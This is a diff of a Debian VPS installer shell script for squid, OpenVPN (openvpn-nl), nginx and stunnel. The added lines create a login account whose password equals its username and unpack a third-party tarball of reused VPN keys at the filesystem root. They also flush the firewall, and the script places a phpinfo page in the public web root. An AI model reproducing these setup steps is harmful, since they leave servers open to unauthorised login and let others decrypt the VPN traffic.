@@ -110,13 +110,35 @@ wget -O /etc/squid3/squid.conf "http://www.borneovpshosting.com/Debian9/squid.co
 wget -O /etc/squid/squid.conf "http://www.borneovpshosting.com/Debian9/squid.conf"
 sed -i "s/ipserver/$myip/g" /etc/squid3/squid.conf
 sed -i "s/ipserver/$myip/g" /etc/squid/squid.conf
-# openvpn
-apt-get -y install openvpn
-cd /etc/openvpn/
-wget -O openvpn.tar "http://www.borneovpshosting.com/Debian9/openvpn.tar"
-tar xf openvpn.tar;rm openvpn.tar
-wget -O /etc/rc.local "http://www.borneovpshosting.com/Debian9/rc.local"
-chmod +x /etc/rc.local
+#needed by openvpn-nl
+apt-get -y install apt-transport-https
+#adding source list
+echo "deb https://openvpn.fox-it.com/repos/deb wheezy main" > /etc/apt/sources.list.d/foxit.list
+apt-get update
+wget https://openvpn.fox-it.com/repos/fox-crypto-gpg.asc
+apt-key add fox-crypto-gpg.asc
+apt-get update
+cd /root
+#installing normal openvpn, easy rsa & openvpn-nl
+apt-get install easy-rsa -y
+apt-get install openvpn -y
+apt-get install openvpn-nl -y
+#ipforward
+sysctl -w net.ipv4.ip_forward=1
+sed -i 's/#net.ipv4.ip_forward=1/net.ipv4.ip_forward=1/g' /etc/sysctl.conf
+iptables -F
+iptables -t nat -F
+iptables -t nat -A POSTROUTING -s 10.8.0.0/16 -o eth0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 172.16.0.0/16 -o eth0 -j MASQUERADE
+iptables -t nat -A POSTROUTING -s 172.1.0.0/16 -o eth0 -j MASQUERADE
+iptables-save
+#fast setup with old keys, optional if we want new key
+cd /
+wget https://raw.githubusercontent.com/zero9911/script/master/script/ovpn.tar
+tar -xvf ovpn.tar
+rm ovpn.tar
+service openvpn-nl restart
+openvpn-nl --remote CLIENT_IP --dev tun0 --ifconfig 10.9.8.1 10.9.8.2
 # nginx
 apt-get -y install nginx php-fpm php-mcrypt php-cli libexpat1-dev libxml-parser-perl
 rm /etc/nginx/sites-enabled/default
@@ -127,18 +149,13 @@ echo "<pre>Setup by Nobita95 | telegram @inject69 | website inject69.tk</pre>" >
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf "http://www.borneovpshosting.com/Debian9/vps.conf"
 sed -i 's/listen = \/var\/run\/php7.0-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php/7.0/fpm/pool.d/www.conf
-# etc
+#config upload
 wget -O /home/vps/public_html/client.ovpn "https://raw.githubusercontent.com/SSL3/33L/master/client.ovpn"
-wget -O /home/vps/public_html/client1.ovpn "http://www.borneovpshosting.com/Debian9/client1.ovpn"
-wget -O /etc/motd "https://raw.githubusercontent.com/guardeumvpn/Qwer77/master/motd"
-sed -i 's/AcceptEnv/#AcceptEnv/g' /etc/ssh/sshd_config
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client.ovpn
-sed -i "s/ipserver/$myip/g" /home/vps/public_html/client1.ovpn
-#useradd -m -g users -s /bin/bash test
-#echo "test:test" | chpasswd
-echo "UPDATE AND INSTALL COMPLETE COMPLETE 99% BE PATIENT"
-rm *.sh;rm *.txt;rm *.tar;rm *.deb;rm *.asc;rm *.zip;rm ddos*;
-clear
+sed -i "s/ipserver/$myip/g" /home/vps/public_html/max.ovpn
+cd
+#add user
+useradd -m -g users -s /bin/bash mklet
+echo "mklet:mklet" | chpasswd
 
 # install stunnel
 apt-get install stunnel4 -y
